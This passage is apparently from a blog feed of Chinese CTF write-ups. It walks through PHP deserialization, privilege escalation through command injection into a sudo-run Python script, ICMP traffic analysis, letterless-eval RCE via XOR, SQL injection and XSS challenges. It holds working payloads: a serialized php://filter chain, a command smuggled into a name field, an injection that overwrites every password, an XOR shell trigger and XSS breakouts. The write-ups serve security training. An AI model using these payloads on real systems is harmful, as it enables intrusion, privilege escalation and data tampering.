class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0); / 关闭错误报告</span><br><span class="line">class K1T0</span><br><span class="line">&#123;</span><br><span class="line">protected $file = &#x27;FLAG.php&#x27;;</span><br><span class="line">public $test;</span><br><span class="line">public function _ construct($file)</span><br><span class="line">&#123;</span><br><span class="line">$this &gt; file = $file;</span><br><span class="line">&#125;</span><br><span class="line">public function test()</span><br><span class="line">&#123;</span><br><span class="line">system($this &gt; test);</span><br><span class="line">&#125;</span><br><span class="line">function _ toString()</span><br><span class="line">&#123;</span><br><span class="line">if (!empty($this &gt; file)) &#123;</span><br><span class="line">if (!preg_match(&#x27;/filter/&#x27;, $this &gt; file)) &#123;</span><br><span class="line">echo $this &gt; file;</span><br><span class="line">printf(&quot;再试试&quot;);</span><br><span class="line">其实这个序列化很简单链子是 APT &gt; K1T0 触发魔术方法 toString</span><br><span class="line">exit();</span><br><span class="line">&#125; else &#123;</span><br><span class="line">include($this &gt; file);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return &quot;successful guy!!!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">public function kkk()</span><br><span class="line">&#123;</span><br><span class="line">eval ($this &gt; test);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">class APT</span><br><span class="line">&#123;</span><br><span class="line">public $eth0;</span><br><span class="line">public $eth1;</span><br><span class="line">function _ wakeup()</span><br><span class="line">&#123;</span><br><span class="line">echo $this &gt; eth0;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">if (!isset($_GET[&#x27;file&#x27;])) &#123;</span><br><span class="line">show_source( _ FILE _ );</span><br><span class="line">&#125; else &#123;</span><br><span class="line">$file = base64_decode($_GET[&#x27;file&#x27;]);</span><br><span class="line">unserialize($file);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0); / 关闭错误报告</span><br><span class="line">class K1T0</span><br><span class="line">&#123;</span><br><span class="line">protected $file = &#x27;php: / filter/read=convert.base64-</span><br><span class="line">encode/resource=/flag&#x27;;</span><br><span class="line">public $test;</span><br><span class="line">function _ toString()</span><br><span class="line">&#123;</span><br><span class="line">if (!empty($this &gt; file)) &#123;</span><br><span class="line">if (!preg_match( &quot;filter&quot;,$this &gt; file)) &#123;</span><br><span class="line">printf(&quot;再试试&quot;);</span><br><span class="line">exit();</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">include($this &gt; file);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return &quot;successful guy!!!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">class APT</span><br><span class="line">&#123;</span><br><span class="line">public $eth0;</span><br><span class="line">public $eth1;</span><br><span class="line">&#125;</span><br><span class="line">$a=new APT();</span><br><span class="line">$a &gt; eth0=new K1T0();</span><br><span class="line">echo base64_encode(serialize($a));</span><br><span class="line">?&gt;</span><br><span class="line">?</span><br><span class="line">file=TzozOiJBUFQiOjI6e3M6NDoiZXRoMCI7Tzo0OiJLMVQwIjoyOntzOjc6IgAqA</span><br><span class="line">GZpbGUiO3M6NTQ6InBocDovL2ZpbHRlci9yZWFkPWNvbnZlcnQuYmFzZTY0LWVuY29</span><br><span class="line">kZS9yZXNvdXJjZT0vZmxhZyI7czo0OiJ0ZXN0IjtOO31zOjQ6ImV0aDEiO047fQ</span><br></pre></td></tr></table></figure><blockquote><p>读取的时候是读取/flag，而不是flag.php，不然是读取不出来的。</p></blockquote><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h4 id="真假二维码"><a href="#真假二维码" class="headerlink" title="真假二维码"></a>真假二维码</h4><blockquote><p>考点：文件分离，压缩包密码爆破</p><p>下载附件，得到一个压缩包，需要密码，根据提示</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130220123688.png" alt="image-20241130220123688"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130220230193.png" alt="image-20241130220230193"></p><blockquote><p>解压，有张二维码，扫一下</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130220505297.png" alt="image-20241130220505297"></p><blockquote><p>假的flag，binwalk看一下，发现有包含文件，直接foremost提取，得到另一张二维码</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130220723797.png" alt="image-20241130220723797"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130220739858.png" alt="image-20241130220739858"></p><blockquote><p>HUBUMARS{751da030-96b5-11ef-89a7-00155d84ef90}</p></blockquote><h4 id="Get-Root-or-Get-Lost"><a href="#Get-Root-or-Get-Lost" class="headerlink" title="Get Root or Get Lost *"></a>Get Root or Get Lost *</h4><blockquote><p>考点：提权</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207173433217.png" alt="image-20241207173433217"></p><blockquote><p>先按照提示连接。</p><p>提权，先试试 sudo -l</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207173550048.png" alt="image-20241207173550048"></p><blockquote><p>以sudo命令执行 /opt/game.py ，发现该文件不可读</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207173930648.png" alt="image-20241207173930648"></p><blockquote><p>但是在hubumars的家目录下有一个备份文件 game.bak</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207174004104.png" alt="image-20241207174004104"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import random</span><br><span class="line">import subprocess</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def play_game():</span><br><span class="line">    choices = [&quot;石头&quot;, &quot;剪刀&quot;, &quot;布&quot;]</span><br><span class="line">    print(&quot;欢迎来到猜拳游戏！&quot;)</span><br><span class="line">    print(&quot;输入你的选择：&quot;)</span><br><span class="line">    print(&quot;1. 石头&quot;)</span><br><span class="line">    print(&quot;2. 剪刀&quot;)</span><br><span class="line">    print(&quot;3. 布&quot;)</span><br><span class="line">    print(&quot;输入 0 退出游戏&quot;)</span><br><span class="line"></span><br><span class="line">    player = input(&quot;请输入你的名字：&quot;)</span><br><span class="line">    while True:</span><br><span class="line">        try:</span><br><span class="line">            # global user_choice</span><br><span class="line">            user_choice = int(input(&quot;你的选择：&quot;))</span><br><span class="line">            if user_choice == 0:</span><br><span class="line">                print(&quot;游戏结束！&quot;)</span><br><span class="line">                break</span><br><span class="line">            if user_choice not in [1, 2, 3]:</span><br><span class="line">                print(&quot;无效输入，请选择 1, 2, 3 或 0 退出游戏。&quot;)</span><br><span class="line">                continue</span><br><span class="line"></span><br><span class="line">            user_move = choices[user_choice - 1]</span><br><span class="line">            computer_move = random.choice(choices)</span><br><span class="line"></span><br><span class="line">            print(f&quot;你选择了：&#123;user_move&#125;&quot;)</span><br><span class="line">            print(f&quot;电脑选择了：&#123;computer_move&#125;&quot;)</span><br><span class="line"></span><br><span class="line">            if user_move == computer_move:</span><br><span class="line">                print(&quot;平局！&quot;)</span><br><span class="line">            elif (</span><br><span class="line">                (user_move == &quot;石头&quot; and computer_move == &quot;剪刀&quot;)</span><br><span class="line">                or (user_move == &quot;剪刀&quot; and computer_move == &quot;布&quot;)</span><br><span class="line">                or (user_move == &quot;布&quot; and computer_move == &quot;石头&quot;)</span><br><span class="line">            ):</span><br><span class="line">                print(&quot;你赢了！载入史册&quot;)</span><br><span class="line">                winner = (</span><br><span class="line">                    &quot;echo 用户 【%s】 你战胜利计算机！载入史册 &gt;&gt; shice.txt &quot; % player</span><br><span class="line">                )</span><br><span class="line">                subprocess.Popen(winner, shell=True)</span><br><span class="line"></span><br><span class="line">            else:</span><br><span class="line">                print(&quot;你输了！&quot;)</span><br><span class="line"></span><br><span class="line">        except ValueError:</span><br><span class="line">            print(&quot;无效输入，请输入数字。&quot;)</span><br><span class="line">            user_choice = &quot;无效输入&quot;</span><br><span class="line">            message = &quot;echo 警报警报，检测%s 恶意输入 %s &gt;&gt; warning.txt &quot; % (</span><br><span class="line">                player,</span><br><span class="line">                user_choice,</span><br><span class="line">            )</span><br><span class="line">            print(message)</span><br><span class="line">            with open(&quot;warning.txt&quot;, &quot;a&quot;) as file:</span><br><span class="line">                process = subprocess.Popen(</span><br><span class="line">                    [&quot;echo&quot;, message], stdout=file  # 将标准输出重定向到文件</span><br><span class="line">                )</span><br><span class="line">                process.communicate()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    play_game()</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>分析看到这段代码</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">winner = (</span><br><span class="line">                    &quot;echo 用户 【%s】 你战胜利计算机！载入史册 &gt;&gt; shice.txt &quot; % player</span><br><span class="line">                )</span><br><span class="line">                subprocess.Popen(winner, shell=True)</span><br></pre></td></tr></table></figure><blockquote><p>发现会执行winner里面的命令，所以只要将用户名设置成可执行函数，就可以执行。</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207174332055.png" alt="image-20241207174332055"></p><blockquote><p>如上图，whoami被执行了，所以我们这次执行找flag.php的命令</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;find / -name &quot;*flag*&quot; 2&gt;/dev/null;</span><br></pre></td></tr></table></figure><blockquote><p>然后读取root目录下的flag即可</p></blockquote><h4 id="隐秘的流量"><a href="#隐秘的流量" class="headerlink" title="隐秘的流量"></a>隐秘的流量</h4><blockquote><p>考点：流量分析，ICMP协议</p><p>用wireshake打开，统计-&gt; 分级协议</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207175808812.png" alt="image-20241207175808812"></p><blockquote><p>发现有UDP,TCP,ICMP协议</p><p>重点关注ICMP协议。</p><p>WireShark 过滤条件 icmp &amp; icmp.type = 8 【含义：icmp协议，类型8代</p><p>表发送请求，参考：ICMP报文的格式和种类-腾讯云开发者社区-腾讯云)</p><p>注意到后面都有几个特殊的字符，提取出来</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207175917648.png" alt="image-20241207175917648"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 使用tshark 提取</span><br><span class="line">└─🍀 tshark -r secret.pcapng -Y &#x27;icmp &amp;&amp; icmp.type = 8&#x27; -T fields -e &quot;data.data&quot; | xxd -p -r | base32 -d | base64 -d</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">命令解释：</span><br><span class="line">-r : 读取文件，后面跟流量包文件名</span><br><span class="line">-Y : 过滤的条件，这里是icmp的方法请求的流量包</span><br><span class="line">-T :设置输出格式，如json，fields等</span><br><span class="line">-e : 输出特定的字段</span><br><span class="line">xxd -p -r ：将十六进制转化为字符串</span><br><span class="line"></span><br><span class="line">windows如果安装了wireshake，则在其目录下有个tshark.exe程序。</span><br></pre></td></tr></table></figure><blockquote><p>HUBUMARS{1CMp_da7a_15_1n73R3571N9}</p></blockquote>]]></content>
    
    
    <summary type="html">🥧HUBU新星杯wp</summary>
    
    
    
    <category term="CTF" scheme="https://m3x1.cn/categories/CTF/"/>
    
    
    <category term="比赛wp" scheme="https://m3x1.cn/tags/%E6%AF%94%E8%B5%9Bwp/"/>
    
  </entry>
  
  <entry>
    <title>HUBUCTF-2022-新生赛-wp</title>
    <link href="https://m3x1.cn/posts/1f67230d.html"/>
    <id>https://m3x1.cn/posts/1f67230d.html</id>
    <published>2024-11-28T16:00:00.000Z</published>
    <updated>2024-12-02T09:07:35.333Z</updated>
    
    <content type="html"><![CDATA[<h2 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h2><blockquote><p>考点：反序列化，弱比较，php</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">$username  = &quot;this_is_secret&quot;; </span><br><span class="line">$password  = &quot;this_is_not_known_to_you&quot;; </span><br><span class="line">include(&quot;flag.php&quot;);//here I changed those two </span><br><span class="line">$info = isset($_GET[&#x27;info&#x27;])? $_GET[&#x27;info&#x27;]: &quot;&quot; ;</span><br><span class="line">$data_unserialize = unserialize($info);</span><br><span class="line">if ($data_unserialize[&#x27;username&#x27;]==$username&amp;&amp;$data_unserialize[&#x27;password&#x27;]==$password)&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;username or password error!&quot;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>代码审计，只需要传入的info的username和password值与变量的值弱比较。</p><p>这里很容易想到相等（强比较），但是其实是弱比较，而且根据提示可以知道这两个变量的值会改变，所以我们不知道确切的值，直接构造赋值0和1，最后发现0和0成功了，所以这两个变量改变了后还是字符串</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241129191723974.png" alt="image-20241129191723974"></p><blockquote><p> NSSCTF{29cf034a-9052-4aec-b776-b1c8b18b82f5}</p></blockquote><h2 id="HowToGetShell"><a href="#HowToGetShell" class="headerlink" title="HowToGetShell"></a>HowToGetShell</h2><blockquote><p>考点：无字母rce，php</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">$mess=$_POST[&#x27;mess&#x27;];</span><br><span class="line">if(preg_match(&quot;/[a-zA-Z]/&quot;,$mess))&#123;</span><br><span class="line">    die(&quot;invalid input!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">eval($mess);</span><br></pre></td></tr></table></figure><p>过滤了所有字母，但有字母，可以使用异或绕过。脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">valid = &quot;1234567890!@$%^*()&#123;&#125;[];\&#x27;\&quot;,.&lt;&gt;/?-=_`~ &quot; #可以用的符号</span><br><span class="line">answer = &quot;phpinfo&quot;  #要构造的命令</span><br><span class="line">tmp1,tmp2 = &#x27;&#x27;,&#x27;&#x27;</span><br><span class="line">for c in answer:</span><br><span class="line">    for i in valid:</span><br><span class="line">        for j in valid:</span><br><span class="line">            if (ord(i)^ord(j) == ord(c)):</span><br><span class="line">                tmp1 += i</span><br><span class="line">                tmp2 += j</span><br><span class="line">                break</span><br><span class="line">        else:</span><br><span class="line">            continue</span><br><span class="line">        break</span><br><span class="line">print(tmp1,tmp2)</span><br><span class="line">//0302181 @[@[_^^ ，所以传入&quot;0302181&quot;^&quot;@[@[_^^&quot;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mess=$_=&quot;0302181&quot;^&quot;@[@[_^^&quot;;$_();</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241129203748374.png" alt="image-20241129203748374"></p><blockquote><p>NSSCTF{3290ae33-f255-4d6b-9bba-2b1be6ddd485} </p></blockquote><h2 id="Calculate"><a href="#Calculate" class="headerlink" title="Calculate"></a>Calculate</h2><blockquote><p>考点：python,web,脚本编写</p></blockquote><p>直接上脚本吧</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">import re</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"># 假设这是我们要与之交互的网站的URL</span><br><span class="line">url = &#x27;http://node5.anna.nssctf.cn:28984/&#x27;  # 请替换为实际的URL</span><br><span class="line"></span><br><span class="line"># 创建一个会话来保持cookie和其他会话信息</span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line"># 正则表达式模式来匹配数字或运算符，它们被&lt;div&gt;标签包围</span><br><span class="line">pattern = re.compile(r&#x27;&lt;div[^&gt;]*?&gt;([0-9+\-*\/=]+)&lt;/div&gt;&#x27;)</span><br><span class="line"></span><br><span class="line"># 循环直到我们找到包含关键词&quot;ctf&quot;的页面</span><br><span class="line">for i in range(20):</span><br><span class="line">    # 发送GET请求来获取当前页面</span><br><span class="line">    response = session.get(url)</span><br><span class="line">    html_content = response.text</span><br><span class="line">    </span><br><span class="line">    # 使用BeautifulSoup解析HTML内容</span><br><span class="line">    soup = BeautifulSoup(html_content, &#x27;html.parser&#x27;)</span><br><span class="line">    </span><br><span class="line">    # 查找所有包含数字或运算符的&lt;div&gt;标签</span><br><span class="line">    divs = soup.find_all(&#x27;div&#x27;, text=re.compile(r&#x27;[0-9+\-*\/=]&#x27;))</span><br><span class="line">    </span><br><span class="line">    # 使用正则表达式从标签中提取数字或运算符</span><br><span class="line">    tokens = pattern.findall(str(divs))</span><br><span class="line">    </span><br><span class="line">    # 拼接成一个数学表达式（注意：这里假设表达式是简单的，没有括号）</span><br><span class="line">    # 我们需要去除任何多余的空格和可能的=符号（它可能是表达式的一部分或用于提示用户输入）</span><br><span class="line">    # 并且我们假设=符号后面不会紧跟数字或运算符（即它是表达式的结尾）</span><br><span class="line">    expression_parts = [token for token in tokens if token != &#x27;=&#x27;]</span><br><span class="line">    expression = &#x27;&#x27;.join(expression_parts).replace(&#x27; &#x27;, &#x27;&#x27;)</span><br><span class="line">    print(expression)</span><br><span class="line">    # 计算表达式的值（注意：这里使用eval有安全风险，但在本例中为了简化而使用）</span><br><span class="line">    try:</span><br><span class="line">        result = eval(expression)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(f&quot;Error evaluating expression &#x27;&#123;expression&#125;&#x27;: &#123;e&#125;&quot;)</span><br><span class="line">        break</span><br><span class="line"></span><br><span class="line">    # 为了避免过快地发送请求，我们添加了一个短暂的延迟（至少1秒）</span><br><span class="line">    # 根据题目要求，我们不能在1秒内回答一个问题，所以这里使用0.5秒的延迟</span><br><span class="line">    time.sleep(1.1)</span><br><span class="line">    # 准备POST数据</span><br><span class="line">    post_data = &#123;&#x27;ans&#x27;: result&#125;</span><br><span class="line">    print(result)</span><br><span class="line">    # 发送POST请求将答案发送回服务器</span><br><span class="line">    post_response = session.post(url, data=post_data)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    # 检查响应内容是否包含关键词&quot;ctf&quot;</span><br><span class="line">print(post_response.text)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"># 关闭会话</span><br><span class="line">session.close()</span><br></pre></td></tr></table></figure><blockquote><p>NSSCTF{32a5eadd-b078-4e0c-9570-1b2852476085}</p></blockquote><h2 id="ezsql"><a href="#ezsql" class="headerlink" title="ezsql"></a>ezsql</h2><blockquote><p>考点：sql注入</p></blockquote><p>先扫一下目录，发现源码，审计源码，发现sql注入</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241129231234785.png" alt="image-20241129231234785"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241129231223286.png" alt="image-20241129231223286"></p><p>根据提示，存在sql注入，直接sqlmap扫</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241129230333540.png" alt="image-20241129230333540"></p><p>发现在年龄处存在sql注入漏洞，且根据payload可以看出是数字型注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">修改当前表所有nickname为444</span><br><span class="line">nickname=aa&amp;age=11,nickname=444%23&amp;description=111&amp;token=</span><br><span class="line">修改当前表所有password为123</span><br><span class="line">nickname=aa&amp;age=11,password=0x3230326362393632616335393037356239363462303731353264323334623730%23&amp;description=111&amp;token=</span><br><span class="line">#0x3230326362393632616335393037356239363462303731353264323334623730=hex(md5(‘123’))</span><br><span class="line">#urlencode(#)=%23</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241129231014113.png" alt="image-20241129231014113"></p><blockquote><p>NSSCTF{3a6a5fad-87c3-4a7a-a6b6-35f1a532b42e}</p></blockquote>]]></content>
    
    
    <summary type="html">🥧HUBUCTF-2022-新生赛-wp</summary>
    
    
    
    <category term="CTF" scheme="https://m3x1.cn/categories/CTF/"/>
    
    
    <category term="比赛wp" scheme="https://m3x1.cn/tags/%E6%AF%94%E8%B5%9Bwp/"/>
    
  </entry>
  
  <entry>
    <title>CTFHub技能树-XSS</title>
    <link href="https://m3x1.cn/posts/57dd66d8.html"/>
    <id>https://m3x1.cn/posts/57dd66d8.html</id>
    <published>2024-11-27T16:00:00.000Z</published>
    <updated>2025-02-01T16:19:14.230Z</updated>
    
    <content type="html"><![CDATA[<h2 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h2><p>打开网站</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/9bb879732317d8055c0970fba4a32d29.png" alt="img"></p><p>反射型，直接使用xss平台，将生成的地址传入第一个空</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128191232646.png" alt="image-20241128191232646"></p><p>然后将url代码传入第二个空就行</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128191309973.png" alt="image-20241128191309973"></p><p>flag=ctfhub{a51bb55f89d068a011466d62}</p><h2 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h2><p>打开网站，依然像上面的步骤一样。</p><p>区别于前面反射型xss的是，他建立恶意连接是在于每一次都要发送含恶意代码，而这个存储xss不需要，一旦发送过一次，以后每次访问它时，都会含有恶意代码</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128215208090.png" alt="image-20241128215208090"></p><blockquote><p>flag=ctfhub{1cef0cbbc0bb33244d4a5c76}</p></blockquote><h2 id="DOM反射"><a href="#DOM反射" class="headerlink" title="DOM反射"></a>DOM反射</h2><p>查看源码位置</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128215659407.png" alt="image-20241128215659407"></p><p>需要闭合前面的 ‘  ，所以只需要在xss注入时前面加上’; ，然后把后面的’;注释掉。</p><p>由于前面没有东西了，所以</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/script&gt;&lt;script src= &gt;</span><br></pre></td></tr></table></figure><p>其余步骤一样</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128220249060.png" alt="image-20241128220249060"></p><blockquote><p>flag=ctfhub{aebf8f6244f0ad340612cc6e}</p></blockquote><h2 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h2><p>步骤一样，空格可以用[/]或者/**/代替</p><blockquote><p>flag=ctfhub{9830f9e82cfbc1e77a1d0dae}</p></blockquote><h2 id="过滤关键词"><a href="#过滤关键词" class="headerlink" title="过滤关键词"></a>过滤关键词</h2><p>先用探针试试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128230131380.png" alt="image-20241128230131380"></p><p>发现没有</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">script</span><br></pre></td></tr></table></figure><p>所以是过滤了关键字script，可以使用大小写绕过，用sCRiPt</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128230522782.png" alt="image-20241128230522782"></p><blockquote><p>flag=ctfhub{9f0740745ba9e7b754658614}</p></blockquote><h2 